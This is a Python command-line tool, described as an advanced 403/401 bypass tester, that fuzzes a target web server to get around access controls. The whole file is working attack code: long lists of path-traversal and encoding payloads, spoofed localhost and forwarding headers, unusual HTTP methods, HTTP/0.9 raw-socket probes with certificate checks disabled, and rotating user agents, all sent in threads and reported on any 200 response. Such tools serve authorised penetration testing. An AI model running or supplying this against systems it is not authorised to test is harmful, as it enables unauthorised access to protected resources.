#!/usr/bin/env python3
import requests
import sys
import argparse
import random
import string
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, quote

class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'
    BOLD = '\033[1m'

def random_user_agent():
    browsers = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)'
    ]
    return random.choice(browsers) + ' ' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

def format_url(base_url, path):
    """Formata a URL corretamente, garantindo uma única barra entre o domínio e o path"""
    base_url = base_url.rstrip('/')
    if not path:
        return base_url
    path = path.lstrip('/')
    return f"{base_url}/{path}"

def get_domain(url):
    """Extrai o domínio da URL (sem protocolo e porta)"""
    parsed = urlparse(url)
    domain = parsed.netloc.split(':')[0]
    return domain

PATH_MANIPULATION_TECHNIQUES = [
    # Basic techniques
    "{0}", "%2e/{0}", "%2f{0}/", "%2f{0}%2f", "./{0}/",
    "{0}/.", "/{0}/./", "/{0}//", "./{0}/./",
    "{0}?", "{0}.html", "{0}.php", "{0}#",
    
    # Advanced techniques
    "{0}..;/", "{0};/", "//{0}///", 
    "{0}/ ".upper(), "*{0}/", "/{0}", "/{0}//",
    "{0}../", "{0}/*", ";/{0}/", "/;//{0}/",
    "{0}%00", "{0}/{0}.txt", "{0}.",
    "{0}..%2f", "{0}%20", "{0}%09", "{0}.json", "{0}.xml",
    "{0}%23", "{0}%3f", "{0}%26", "{0}%2e", 
    "{0}..%00/", "{0}..%0d/", "{0}..%5c", "{0}..\\", "{0}..%ff/",
    "{0}%2e%2e%2f", "{0}.%2e/", "{0}%3f", "{0}%26", "{0}%23",
    "{0}/.", "{0}?", "{0}??", "{0}???", "{0}#", 
    "{0}/.randomstring", "{0}.html", "{0}%20/", "{0}%20assets%20/",
    "{0}.json", "{0}\\..\\.\\", "{0}/*", "{0}/./", "{0}/*/",
    "{0}/..;/", "{0}%2e/assets", "{0}/%2e/", "{0}//.", "{0}////",
    "{0};assets/"
]

BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Original-URL": ""},
    {"X-Rewrite-URL": ""},
    {"Host": "localhost"},
    {"X-Originally-Forwarded-For": "127.0.0.1, 68.180.194.242"},
    {"X-Originating-": "127.0.0.1, 68.180.194.242"},
    {"X-WAP-Profile": "127.0.0.1, 68.180.194.242"},
    {"From": "127.0.0.1, 68.180.194.242"},
    {"Profile": "http://{domain}"},
    {"X-Arbitrary": "http://{domain}"},
    {"X-HTTP-DestinationURL": "http://{domain}"},
    {"X-Forwarded-Proto": "http://{domain}"},
    {"Destination": "127.0.0.1"},
    {"Proxy": "127.0.0.1"},
    {"CF-Connecting_IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Base-Url": "127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"Http-Url": "127.0.0.1"},
    {"Proxy-Host": "127.0.0.1"},
    {"Proxy-Url": "127.0.0.1"},
    {"Real-Ip": "127.0.0.1"},
    {"Redirect": "127.0.0.1"},
    {"Referrer": "127.0.0.1"},
    {"Request-Uri": "127.0.0.1"},
    {"Uri": "127.0.0.1"},
    {"Url": "127.0.0.1"},
    {"X-Forward-For": "127.0.0.1"},
    {"X-Forwarded-By": "127.0.0.1"},
    {"X-Forwarded-For-Original": "127.0.0.1"},
    {"X-Forwarded-Server": "127.0.0.1"},
    {"X-Forwarded": "127.0.0.1"},
    {"X-Forwarder-For": "127.0.0.1"},
    {"X-Http-Destinationurl": "127.0.0.1"},
    {"X-Http-Host-Override": "127.0.0.1"},
    {"X-Original-Remote-Addr": "127.0.0.1"},
    {"X-Proxy-Url": "127.0.0.1"},
    {"X-Real-Ip": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-OReferrer": "https%3A%2F%2Fwww.google.com%2F"},
    {"X-Forwarded-Scheme": "http"},
    {"X-Forwarded-Scheme": "https"},
    {"X-Forwarded-Proto": "http"},
    {"X-Forwarded-Port": "80"},
    {"X-Forwarded-Port": "443"},
    {"X-Forwarded-Port": "8080"},
    {"X-Forwarded-Port": "8443"},
    {"X-Forwarded-Port": "4443"},
    {"Referer": "{target}"},
    {"Origin": "{target}"},
    {"X-Requested-With": "XMLHttpRequest"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Custom-IP-Authorization..;/": "127.0.0.1"}
]

HTTP_METHODS = [
    "GET", "POST", "PUT", "HEAD", "PATCH", "TRACE",
    "OPTIONS", "CONNECT", "DEBUG",
    "CHECKOUT", "COPY", "LOCK", "UNLOCK", "PROPFIND",
    "SEARCH", "PROPPATCH", "MKCOL", "MOVE", "TRACK",
    "UPDATE",
    "GWT"
]

PARAMETER_TECHNIQUES = [
    "?#",
    "?%23",
    "?%3f",
    "?%26",
    "?%20",
    "?%09",
    "?..",
    "?../",
    "?..%2f",
    "?..%00/",
    "?..%0d/",
    "?..%5c",
    "?..\\",
    "?..%ff/",
    "?%2e%2e%2f",
    "?.%2e/",
    "?%3f",
    "?%26",
    "?%23",
    "?%2e",
    "?/.",
    "??",
    "???",
    "?#",
    "?/.randomstring",
    "?.html",
    "?%20/",
    "?%20assets%20/",
    "?.json",
    "?\\..\\.\\",
    "?/*",
    "?/./",
    "?/*/",
    "?/..;/",
    "?%2e/assets",
    "?/%2e/",
    "?//.",
    "?////",
    "?;assets/"
]

ENCODING_TECHNIQUES = [
    "%09", "%09%3b", "%09..", "%09..;", "%09;",
    "%20", "%23%3f", "%252f%252f", "%252f/",
    "%2e%2e", "%2e%2e%3b/", "%2e%2e/", "%2e%2f/",
    "%2e%3b/", "%2e%3b//", "%2e/", "%2e//", "%2f",
    "%3b/", "..", "..%2f", "..%2f..%2f", "..%2f..%2f..%2f",
    "../", "../../", "../../../", "../../..//",
    "../..//", "../..//../", "../..;/", ".././../",
    "../.;/../", "..//", "..//../", "..//../../",
    "..//..;/", "../;/", "../;/../", "..;%2f",
    "..;%2f..;%2f", "..;%2f..;%2f..;%2f", "..;/../",
    "..;/..;/", "..;//", "..;//../", "..;//..;/",
    "..;/;/", "..;/;/..;/", ".//", ".;/", ".;//",
    "//..", "//../../", "//..;", "//./", "//.;/",
    "///..", "///../", "///..//", "///..;", "///..;/",
    "///..;//", "//;/", "/;/", "/;//", "/;x", "/;x/",
    "/x/../", "/x/..//", "/x/../;/", "/x/..;/", "/x/..;//",
    "/x/..;/;/", "/x//../", "/x//..;/", "/x/;/../",
    "/x/;/..;/", ";", ";%09", ";%09..", ";%09..;",
    ";%09;", ";%2F..", ";%2f%2e%2e", ";%2f%2e%2e%2f%2e%2e%2f%2f",
    ";%2f%2f/../", ";%2f..", ";%2f..%2f%2e%2e%2f%2f",
    ";%2f..%2f..%2f%2f", ";%2f..%2f/", ";%2f..%2f/..%2f",
    ";%2f..%2f/../", ";%2f../%2f..%2f", ";%2f../%2f../",
    ";%2f..//..%2f", ";%2f..//../", ";%2f..///",
    ";%2f..///;", ";%2f..//;/", ";%2f..//;/;", ";%2f../;//",
    ";%2f../;/;/", ";%2f../;/;/;", ";%2f..;///",
    ";%2f..;//;/", ";%2f..;/;//", ";%2f/%2f../",
    ";%2f//..%2f", ";%2f//../", ";%2f//..;/", ";%2f/;/../",
    ";%2f/;/..;/", ";%2f;//../", ";%2f;/;/..;/", ";/%2e%2e",
    ";/%2e%2e%2f%2f", ";/%2e%2e%2f/", ";/%2e%2e/", ";/%2e.",
    ";/%2f%2f../", ";/%2f/..%2f", ";/%2f/../", ";/.%2e",
    ";/.%2e/%2e%2e/%2f", ";/..", ";/..%2f", ";/..%2f%2f../",
    ";/..%2f..%2f", ";/..%2f/", ";/..%2f//", ";/../",
    ";/../%2f/", ";/../../", ";/../..//", ";/.././../",
    ";/../.;/../", ";/..//", ";/..//%2e%2e/", ";/..//%2f",
    ";/..//../", ";/..///", ";/../;/", ";/../;/../",
    ";/..;", ";/.;.", ";//%2f../", ";//..", ";//../../",
    ";///..", ";///../", ";///..//", ";///..;", ";///..;/",
    ";x", ";x/", ";x;", "&", "%", "%09", "../",
    "../%2f", ".././", "..%00/", "..%0d/", "..%5c",
    "..\\", "..%ff/", "%2e%2e%2f", ".%2e/", "%3f",
    "%26", "%23", "%2e", "/.", "?", "??", "???",
    "#", "/.randomstring", ".html", "%20/", "%20assets%20/",
    ".json", "\\..\\.\\", "/*", "/./", "/*/", "/..;/",
    "%2e/assets", "/%2e/", "//.", "////", ";assets/"
]

def test_fuzzing(url, path=None, method="GET", headers=None, verbose=False):
    """Test a single request with given parameters"""
    try:
        test_url = format_url(url, path) if path else url
        
        req_headers = {"User-Agent": random_user_agent()}
        if headers:
            # Create a copy of headers to avoid modifying the original
            processed_headers = headers.copy()
            
            for k, v in processed_headers.items():
                if v and isinstance(v, str):
                    # Replace placeholders
                    if "{domain}" in v:
                        domain = get_domain(url)
                        processed_headers[k] = v.replace("{domain}", domain)
                    if "{target}" in v:
                        processed_headers[k] = v.replace("{target}", url)
                    if "{path}" in v:
                        processed_headers[k] = v.replace("{path}", path.lstrip('/') if path else "")
            
            req_headers.update(processed_headers)
        
        if verbose:
            print(f"{colors.BLUE}[*] Testing: {method} {test_url}{colors.END}")
            if headers:
                print(f"{colors.BLUE}    Headers: {processed_headers}{colors.END}")
        
        # Verificação adicional para métodos malformados
        if any(c.isspace() for c in method):
            if verbose:
                print(f"{colors.YELLOW}    Skipping malformed method: {method}{colors.END}")
            return False, 0, None, None, None
        
        if method.upper() == "GET":
            response = requests.get(
                test_url,
                headers=req_headers,
                timeout=5,
                allow_redirects=True
            )
        else:
            try:
                response = requests.request(
                    method.upper(),
                    test_url,
                    headers=req_headers,
                    timeout=5,
                    allow_redirects=True
                )
            except ValueError as e:
                if "Method cannot contain non-token characters" in str(e):
                    if verbose:
                        print(f"{colors.YELLOW}    Skipping invalid method: {method}{colors.END}")
                    return False, 0, None, None, None
                raise
        
        if response.status_code == 200:
            return True, response.status_code, method, processed_headers if headers else None, path
    except Exception as e:
        if verbose:
            print(f"{colors.RED}    Error: {e}{colors.END}")
    return False, 0, None, None, None

def test_protocol_switch(url, path=None, verbose=False):
    """Test switching between HTTP/HTTPS protocols"""
    base_url = url.replace('https://', 'http://') if url.startswith('https://') else url.replace('http://', 'https://')
    test_url = format_url(base_url, path) if path else base_url
    
    if verbose:
        print(f"{colors.BLUE}[*] Testing protocol switch: {test_url}{colors.END}")
    
    try:
        response = requests.get(
            test_url,
            headers={"User-Agent": random_user_agent()},
            timeout=5,
            allow_redirects=True
        )
        
        if response.status_code == 200:
            return True, response.status_code, "GET", None, path, test_url
    except Exception as e:
        if verbose:
            print(f"{colors.RED}    Error: {e}{colors.END}")
    
    return False, 0, None, None, None, None

def test_port_bypass(url, path=None, verbose=False):
    """Test port bypass techniques"""
    test_url = format_url(url, path) if path else url
    
    ports = [80, 443, 8080, 8443, 4443]
    headers = [{"X-Forwarded-Port": str(port)} for port in ports]
    
    for header in headers:
        try:
            if verbose:
                print(f"{colors.BLUE}[*] Testing port header: {header} on {test_url}{colors.END}")
            
            response = requests.get(
                test_url,
                headers={"User-Agent": random_user_agent(), **header},
                timeout=5,
                allow_redirects=True
            )
            
            if response.status_code == 200:
                return True, response.status_code, "GET", header, path
        except Exception as e:
            if verbose:
                print(f"{colors.RED}    Error: {e}{colors.END}")
    
    return False, 0, None, None, None

def test_parameter_pollution(url, path=None, verbose=False):
    """Tests parameter pollution techniques"""
    if not path:
        return False, 0, None, None, None
    
    base_url = url.rstrip('/')
    effective_path = path.lstrip('/')
    
    for technique in PARAMETER_TECHNIQUES:
        try:
            test_url = f"{base_url}/{effective_path}{technique}"
            
            if verbose:
                print(f"{colors.BLUE}[*] Testing parameter pollution: {test_url}{colors.END}")
            
            response = requests.get(
                test_url,
                headers={"User-Agent": random_user_agent()},
                timeout=5,
                allow_redirects=True
            )
            
            if response.status_code == 200:
                return True, response.status_code, "GET", None, f"{effective_path}{technique}"
        except Exception as e:
            if verbose:
                print(f"{colors.RED}    Error: {e}{colors.END}")
    
    return False, 0, None, None, None

def test_encoding_techniques(url, path=None, verbose=False):
    """Tests advanced encoding techniques"""
    if not path:
        return False, 0, None, None, None
    
    effective_path = path.lstrip('/')
    
    for technique in ENCODING_TECHNIQUES:
        try:
            if '{0}' in technique:
                encoded_path = technique.format(effective_path)
            else:
                encoded_path = f"{effective_path}{technique}"
            
            test_url = format_url(url, encoded_path)
            
            if verbose:
                print(f"{colors.BLUE}[*] Testing encoding: {test_url}{colors.END}")
            
            response = requests.get(
                test_url,
                headers={"User-Agent": random_user_agent()},
                timeout=5,
                allow_redirects=True
            )
            
            if response.status_code == 200:
                return True, response.status_code, "GET", None, encoded_path
        except Exception as e:
            if verbose:
                print(f"{colors.RED}    Error: {e}{colors.END}")
    
    return False, 0, None, None, None

def test_http_0_9(url, path=None, verbose=False):
    """Tests HTTP/0.9 connection"""
    try:
        import socket
        
        base_url = url.replace('https://', '').replace('http://', '').split('/')[0]
        host = base_url.split(':')[0]
        port = int(base_url.split(':')[1]) if ':' in base_url else 80
        
        if url.startswith('https://'):
            import ssl
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        
        effective_path = f"/{path}" if path else "/"
        
        if verbose:
            print(f"{colors.BLUE}[*] Testing HTTP/0.9: {host}:{port}{effective_path}{colors.END}")
        
        if url.startswith('https://'):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s = context.wrap_socket(s, server_hostname=host)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        s.settimeout(5)
        s.connect((host, port))
        s.sendall(f"GET {effective_path}\r\n".encode())
        
        data = s.recv(4096)
        s.close()
        
        if data and b'<' in data and b'>' in data:
            return True, 200, "HTTP/0.9", None, effective_path
    except Exception as e:
        if verbose:
            print(f"{colors.RED}    Error: {e}{colors.END}")
    return False, 0, None, None, None

def print_status(url, status_code, method, headers, path):
    """Exibe os resultados encontrados"""
    full_url = format_url(url, path) if path else url
    print(f"\n{colors.GREEN}[*] Status 200 found{colors.END}")
    print(f"URL: {full_url}")
    print(f"Method: {colors.BOLD}{method}{colors.END}")
    print(f"Status: {colors.BOLD}{status_code}{colors.END}")
    if headers:
        print("Headers:")
        for k, v in headers.items():
            if v:  
                print(f"  {k}: {v}")
    print("-" * 50)

def load_wordlist(wordlist_file):
    try:
        with open(wordlist_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{colors.RED}[!] Wordlist file not found: {wordlist_file}{colors.END}")
        sys.exit(1)

def run_tests(target_url, path, threads=20, verbose=False):
    effective_path = path if path is not None else ""
    
    # Test protocol switch (HTTP/HTTPS)
    success, code, method, headers, path, new_url = test_protocol_switch(target_url, effective_path, verbose)
    if success:
        print_status(new_url, code, method, headers, "")

    # Test HTTP versions
    success, code, method, headers, path = test_http_0_9(target_url, effective_path, verbose)
    if success:
        print_status(target_url, code, method, headers, path)
    
    # Test port bypass
    success, code, method, headers, path = test_port_bypass(target_url, effective_path, verbose)
    if success:
        print_status(target_url, code, method, headers, path)
    
    # Test HTTP Methods
    if verbose:
        print(f"\n{colors.BOLD}[*] Testing HTTP Methods{colors.END}")
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for method in HTTP_METHODS:
            # Verificação adicional antes de enviar
            if any(c.isspace() for c in method):
                if verbose:
                    print(f"{colors.YELLOW}[*] Skipping malformed method: {method}{colors.END}")
                continue
                
            futures.append(executor.submit(test_fuzzing, target_url, effective_path, method, None, verbose))
        
        for future in futures:
            try:
                success, code, method, headers, path = future.result()
                if success:
                    print_status(target_url, code, method, headers, path)
            except Exception as e:
                if verbose:
                    print(f"{colors.RED}    Error processing result: {e}{colors.END}")

    # Test Header Bypass Techniques
    if verbose:
        print(f"\n{colors.BOLD}[*] Testing Header Bypass Techniques{colors.END}")
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for header in BYPASS_HEADERS:
            h = header.copy()
            futures.append(executor.submit(test_fuzzing, target_url, effective_path, "GET", h, verbose))
        
        for future in futures:
            try:
                success, code, _, headers, path = future.result()
                if success:
                    print_status(target_url, code, "GET", headers, path)
            except Exception as e:
                if verbose:
                    print(f"{colors.RED}    Error processing result: {e}{colors.END}")

    # Test Path Manipulation Techniques
    if effective_path:
        if verbose:
            print(f"\n{colors.BOLD}[*] Testing Path Manipulation Techniques{colors.END}")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for technique in PATH_MANIPULATION_TECHNIQUES:
                try:
                    if technique == "{0}/ ".upper():
                        modified_path = technique.format(effective_path.upper())
                    else:
                        modified_path = technique.format(effective_path)
                    
                    if not modified_path.startswith('/'):
                        modified_path = f"/{modified_path}"
                    
                    if verbose:
                        print(f"{colors.BLUE}[*] Testing path: {format_url(target_url, modified_path)}{colors.END}")
                    
                    futures.append(executor.submit(test_fuzzing, target_url, modified_path, "GET", None, verbose))
                except (IndexError, KeyError) as e:
                    if verbose:
                        print(f"{colors.RED}    Error applying technique {technique}: {e}{colors.END}")
                    continue
            
            for future in futures:
                try:
                    success, code, _, _, path = future.result()
                    if success:
                        print_status(target_url, code, "GET", None, path)
                except Exception as e:
                    if verbose:
                        print(f"{colors.RED}    Error processing result: {e}{colors.END}")

    # Test Parameter Pollution Techniques
    if effective_path:
        if verbose:
            print(f"\n{colors.BOLD}[*] Testing Parameter Pollution Techniques{colors.END}")
        
        success, code, method, headers, path = test_parameter_pollution(target_url, effective_path, verbose)
        if success:
            print_status(target_url, code, method, headers, path)

    # Test Encoding Techniques
    if effective_path:
        if verbose:
            print(f"\n{colors.BOLD}[*] Testing Encoding Techniques{colors.END}")
        
        success, code, method, headers, path = test_encoding_techniques(target_url, effective_path, verbose)
        if success:
            print_status(target_url, code, method, headers, path)

def main():
    parser = argparse.ArgumentParser(description='Advanced 403/401 Bypass Testing Tool')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('paths', nargs='?', default=None, help='Paths to test (comma-separated, default: root path)')
    parser.add_argument('-w', '--wordlist', help='Wordlist file containing paths to test')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of threads')
    
    args = parser.parse_args()
    
    if not args.url.startswith(('http://', 'https://')):
        args.url = f'https://{args.url}'
    
    target_url = args.url.rstrip('/')
    
    if args.wordlist:
        paths = load_wordlist(args.wordlist)
        if args.verbose:
            print(f"{colors.BLUE}[*] Testing {len(paths)} paths from wordlist{colors.END}")
        
        for path in paths:
            if args.verbose:
                print(f"\n{colors.BOLD}[*] Testing path: {path}{colors.END}")
            run_tests(target_url, path, args.threads, args.verbose)
    else:
        if args.paths:
            paths = [p.strip() for p in args.paths.split(',')]
            for path in paths:
                if args.verbose:
                    print(f"\n{colors.BOLD}[*] Testing path: {path}{colors.END}")
                run_tests(target_url, path, args.threads, args.verbose)
        else:
            run_tests(target_url, None, args.threads, args.verbose)

if __name__ == "__main__":
    main()
